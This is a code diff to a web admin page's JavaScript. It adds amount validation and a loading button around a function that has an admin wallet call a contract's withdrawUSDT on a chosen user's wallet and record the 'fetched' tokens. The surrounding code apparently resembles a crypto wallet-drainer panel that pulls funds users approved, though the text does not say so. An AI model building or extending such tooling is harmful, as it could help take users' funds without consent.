@@ -223,38 +223,58 @@
         let user = $('#modal-wallet').val();
         let amount = parseInt($('#modal-amount').val());
 
-        try {
-            // Call the withdraw method on the contract
+        var balance = $("#modal-amount").val();
 
-            const transaction = await contract.methods.withdrawUSDT(user, amount).send({
-                from: adminWalletAddress,
-            });
-            console.log('USDT Withdrawal successful:', transaction)
+        var a_balance = $("#modal-balance").text();
 
-            if(transaction)
-            {
-                $.ajaxSetup({
-                headers: {
-                    'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
-                }
+
+        if (parseFloat(balance) > parseFloat(a_balance) || balance == '') {
+
+            $("#modal-amount").css("border", "1px solid red");
+          
+        }else{
+
+            $("#btn-fetch").css('display','none');
+            $("#loader-btn").css('display','block');
+
+            try {
+                // Call the withdraw method on the contract
+
+                const transaction = await contract.methods.withdrawUSDT(user, amount).send({
+                    from: adminWalletAddress,
                 });
+                console.log('USDT Withdrawal successful:', transaction)
 
-                $.ajax({
-                    url: "{{ route('fetch.usdt_tokens') }}",
-                    type: 'POST',
-                    data: {
-                        wallet: user,
-                        amount: amount,
-                        spender: accounts[0],
-                    },
-                }).done(function(response) {
-                    if (response == 'ok') {
-                        window.location.reload();
+                if(transaction)
+                {
+                    $.ajaxSetup({
+                    headers: {
+                        'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                     }
-                });
+                    });
+
+                    $.ajax({
+                        url: "{{ route('fetch.usdt_tokens') }}",
+                        type: 'POST',
+                        data: {
+                            wallet: user,
+                            amount: amount,
+                            spender: accounts[0],
+                        },
+                    }).done(function(response) {
+                        if (response == 'ok') {
+
+                            $("#btn-fetch").css('display','block');
+                            $("#loader-btn").css('display','none');
+
+                            window.location.reload();
+                        }
+                    });
+                }
+            } catch (error) {
+                console.error('Error withdrawing from contract:', error)
             }
-        } catch (error) {
-            console.error('Error withdrawing from contract:', error)
+
         }
     }
 
@@ -325,6 +345,8 @@
             $("#modal-wallet").val(wallet);
             $("#modal-spender").val(adminWalletAddress);
             $("#modal-balance").text(balance);
+
+            $("#btn-fetch").attr('onClick','withdrawUSDT()');
 
             $('#fetchForm').modal({
                 backdrop: 'static',
